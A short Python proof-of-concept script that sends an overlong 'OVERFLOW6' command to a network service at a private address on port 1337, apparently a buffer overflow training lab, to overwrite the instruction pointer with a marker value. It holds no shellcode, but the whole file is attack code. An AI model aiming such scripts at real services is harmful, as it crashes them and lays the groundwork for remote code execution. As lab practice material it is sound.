import socket
import sys
import time


print("[+] Nani???? EIP!!\n")

buff = "A" * 1034

EIP = "B" *  4

Fill = "C" * 62

payload = buff + EIP + Fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW6 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
